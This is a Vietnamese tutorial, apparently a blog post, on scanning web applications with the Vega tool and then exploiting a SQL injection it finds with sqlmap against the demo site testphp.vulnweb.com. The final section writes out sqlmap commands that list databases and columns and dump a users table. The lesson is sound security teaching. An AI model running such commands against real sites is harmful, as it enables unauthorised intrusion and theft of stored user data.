## Scan web là gì
`Scan web` hay `Web application scanning` còn được gọi là quét ứng dụng web, mục đích của việc scan web là quét những lỗ hổng ứng dụng web, thu thập dữ liệu trang web để tìm những lỗ hổng trong các ứng dụng web.

`Scanning software` sau khi phân tích tất các page có thể truy cập sẽ xây dựng cấu trúc của toàn bộ trang web.

`Scan web` cũng có thể coi là một phần quan trọng trong bảo mật ứng dụng web, nó giúp các nhà phát triển ứng dụng web tìm ra những điểm yếu trong những dự án mà họ xây dựng.


## Vega
Vega là một platform để kiểm tra tính bảo mật của một ứng dụng web applications. Vega được viết bằng Java, và chạy trên nhiều nền tảng khác nhau như Linux, OS X, Windows, được phát triển bởi  [Subgraph]( https://subgraph.com/).

Vega có thể hoạt động như một proxy, hoặc như một ứng dụng quét tự động. Các modules  có thể tự động gửi các requests để kiểm tra các lỗ hổng như [XSS](https://viblo.asia/p/ky-thuat-tan-cong-xss-va-cach-ngan-chan-YWOZr0Py5Q0), [SQL injection](https://viblo.asia/p/phan-9-sql-injection-Ljy5VYNMlra)...

## SQLmap
[SQLmap](http://sqlmap.org/) là một công cụ mã nguồn mở, tự động kiểm tra và phát hiện lỗ hổng [SQL injection](https://viblo.asia/p/phan-9-sql-injection-Ljy5VYNMlra), có thể chạy được trên nhiều nền tảng như Linux, Mac OS, Windows.

## Cấu hình và scan
Trong bài viết này mình sử dụng tool [Vega](https://subgraph.com/vega/) để thu thập lỗ hổng, dữ liệu của một trang web.

Trước khi thực hiện scan một trang web nào đó bạn cần nắm rõ mục đích và mong muốn thu thập những gì từ trang web đó để tối giản nhất trong việc scan.

### 1. Cấu hình
* Add target
   
   [Trang web](http://testphp.vulnweb.com/) mà mình demo
    
![](https://images.viblo.asia/5514b65e-40f2-42e3-80a7-022071792854.png)

* Chọn modules cần thiết

![](https://images.viblo.asia/596f8f8c-e043-457b-bb34-78286fb446e9.png)


*  Hoàn tất cấu hình và bắt đầu quét

![](https://images.viblo.asia/e06e7abe-c686-4a18-ad64-660f91cbaa6b.png)

### 2. Thu thập kết quả

Sau khi quét xong chúng ta thấy các lỗ hổng ở từng mức độ khác nhau được thông kê chi tiết

![](https://images.viblo.asia/226327f4-3726-4dc5-a5b1-045f57606ffb.png)

Ở đây mình quét được một số lỗi như  [XSS](https://viblo.asia/p/ky-thuat-tan-cong-xss-va-cach-ngan-chan-YWOZr0Py5Q0), [SQL injection](https://viblo.asia/p/phan-9-sql-injection-Ljy5VYNMlra), [RFI](https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_Remote_File_Inclusion)

![](https://images.viblo.asia/aad5c304-fb71-48a7-863b-53f1c5731658.png)

### 3. Khai thác

Trong bài này mình có dùng [SQLmap](http://sqlmap.org/) để khai thác lỗi  [SQL injection](https://viblo.asia/p/phan-9-sql-injection-Ljy5VYNMlra) mà mình đã quét được để xem độ hiểu quả của tool mình vừa dùng ở trên.

Hoàn toàn có thể xem được requests cũng nhưng response ở từng lỗ hổng một, đây là một requests và response của một lỗi  [SQL injection](https://viblo.asia/p/phan-9-sql-injection-Ljy5VYNMlra) mà mình tìm được.

![](https://images.viblo.asia/e86b37db-ceff-4db2-91c2-ed88caa4a2fc.png)

[SQLmap](http://sqlmap.org/) là một công cụ mạnh và hữu ích cho việc khai thác lỗ hổng  [SQL injection](https://viblo.asia/p/phan-9-sql-injection-Ljy5VYNMlra)

Dùng [SQLmap](http://sqlmap.org/)  để  kiểm tra

```shell
sqlmap -u http://testphp.vulnweb.com/product.php?pic=7%20AND%201=2%20--%20 --keep-alive --random-agent
```

* `-u` url cần quét
* `--keep-alive` sử dụng HTTP(s) connections
* `--random-agent` sử dụng HTTP User-Agent ngẫu nhiên

![](https://images.viblo.asia/41de902f-7f79-460a-892e-eb4e1b3c94e5.png)

```shell
sqlmap -u http://testphp.vulnweb.com/product.php?pic=7%20AND%201=2%20--%20 --dbs
```

* `--dbs` liệt kê các databases

![](https://images.viblo.asia/c8f91e11-31bc-4c99-8069-4bffeebe338e.png)

Sau khi dùng [SQLmap](http://sqlmap.org/)  thì mình có được thông tin có 2 databases, thử xem database `acuart` có gì không nào.

```shell
sqlmap -u http://testphp.vulnweb.com/product.php?pic=7%20AND%201=2%20--%20 -D acuart --columns
```
* `-D` chọn database để thao tác
*  `--colmns` liệt kê các columns

![](https://images.viblo.asia/76cc6727-0022-477d-abfd-ef7cfc6fb772.png)
![](https://images.viblo.asia/021dbf43-f329-4978-bd6c-0c1a4293d3b3.png)
![](https://images.viblo.asia/73f24c8c-0fd9-44fc-9d07-eee975f2252e.png)

Cùng xem bảng users có những thông tin gì

```shell
sqlmap -u http://testphp.vulnweb.com/product.php?pic=7%20AND%201=2%20--%20 -D acuart -T users --dump
```

* `-T` chọn bảng thực thi
*  `--dump` lấy các dữ liệu

![](https://images.viblo.asia/e57a65f6-e639-48c0-9f9b-c39c34ee03e4.png)
      
Đây là ví dụ về 3 bảng mình lấy được, và còn rất nhiều bảng khác nữa qua đó thấy tool [Vega](https://subgraph.com/vega/)  cũng là một công cụ khá hay để quét ứng dụng web đấy chứ.

## Kết luận
[Vega](https://subgraph.com/vega/) còn một số tính năng nữa mà mình chưa khám phá hết, mình sẽ cố gắng tìm hiểu thêm để có thể chia sẻ cùng mọi người.

Hi vọng qua bài viết của mình các bạn có thể hiểu thêm về scan web, cách sử dụng tool [Vega](https://subgraph.com/vega/)  để quét một trang web nào đó, cũng như dùng [SQLmap](http://sqlmap.org/)  để khai thác những lỗi [SQL injection](https://viblo.asia/p/phan-9-sql-injection-Ljy5VYNMlra) mà các bạn quét được.
Cảm ơn các bạn đã theo dõi bài viết của mình!